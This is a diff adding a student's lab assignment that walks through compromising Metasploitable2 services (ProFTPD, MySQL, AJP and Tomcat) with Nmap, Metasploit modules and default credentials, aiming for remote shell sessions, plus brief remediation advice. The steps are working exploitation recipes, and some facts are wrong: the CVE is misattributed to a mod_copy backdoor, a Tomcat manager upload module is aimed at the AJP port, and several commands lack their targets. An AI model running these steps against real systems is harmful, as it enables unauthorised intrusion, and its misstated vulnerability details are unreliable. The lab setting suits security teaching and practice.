@@ -1,0 +1,107 @@
+SECURITY CONCEPTS - ASSIGNMENT 2 PRN: 260240123019 Name: Harshal
+Dahiwale
+
+========================================================= Q1. FTP (Port
+2121/TCP) =========================================================
+
+Service: ProFTPD 1.3.1
+
+Vulnerability: Backdoor in mod_copy module allowing Remote Code
+Execution (CVE-2010-4221).
+
+Step-by-Step Solution:
+
+Step 1: Start the Metasploitable2 target machine and Kali Linux.
+
+Step 2: Scan the target using Nmap: nmap -sV
+
+Step 3: Verify that FTP service is running on port 2121.
+
+Step 4: Open Metasploit: msfconsole
+
+Step 5: Search for the exploit: search proftpd
+
+Step 6: Select the exploit: use exploit/unix/ftp/proftpd_modcopy_exec
+
+Step 7: Configure the target: set RHOSTS
+
+Step 8: Run: exploit
+
+Step 9: Verify that a Meterpreter/Shell session is opened.
+
+========================================================= Q2. MySQL
+(Port 3306/TCP)
+=========================================================
+
+Service: MySQL 5.0.51a-Ubuntu5
+
+Vulnerability: Weak default credentials and SQL Injection.
+
+Step-by-Step Solution:
+
+Step 1: Connect to MySQL: mysql -h -u root -p
+
+Step 2: Try default/weak password if configured.
+
+Step 3: Display databases: show databases;
+
+Step 4: Select a database: use ;
+
+Step 5: Display tables: show tables;
+
+Step 6: Exit: exit
+
+Recommendation: Use strong passwords, disable anonymous access, and
+update MySQL.
+
+========================================================= Q3. AJP13
+(Port 8009/TCP)
+=========================================================
+
+Service: Apache JServ Protocol v1.3
+
+Vulnerability: Arbitrary file upload leading to Remote Code Execution.
+
+Step-by-Step Solution:
+
+Step 1: Open Metasploit: msfconsole
+
+Step 2: Search exploit: search tomcat ajp
+
+Step 3: Use exploit: use exploit/multi/http/tomcat_mgr_upload
+
+Step 4: Configure: set RHOSTS set RPORT 8009 set HttpUsername tomcat set
+HttpPassword tomcat set LHOST
+
+Step 5: Execute: exploit
+
+Step 6: Verify Meterpreter session.
+
+========================================================= Q4. HTTP (Port
+8180/TCP) =========================================================
+
+Service: Apache Tomcat/Coyote JSP Engine 1.1
+
+Vulnerability: Weak Tomcat Manager credentials and JSP upload.
+
+Step-by-Step Solution:
+
+Step 1: Open Metasploit.
+
+Step 2: Load exploit: use exploit/multi/http/tomcat_mgr_upload
+
+Step 3: Configure: set RHOSTS set RPORT 8180 set HttpUsername tomcat set
+HttpPassword tomcat set LHOST
+
+Step 4: Run: exploit
+
+Step 5: Wait for successful deployment.
+
+Step 6: Verify Meterpreter session.
+
+========================================================= Conclusion
+========================================================= Successfully
+identified vulnerable services, exploited the vulnerable targets in the
+lab environment, and verified remote access. Appropriate remediation
+includes patching services, disabling default credentials, enforcing
+strong authentication, and restricting unnecessary network access.
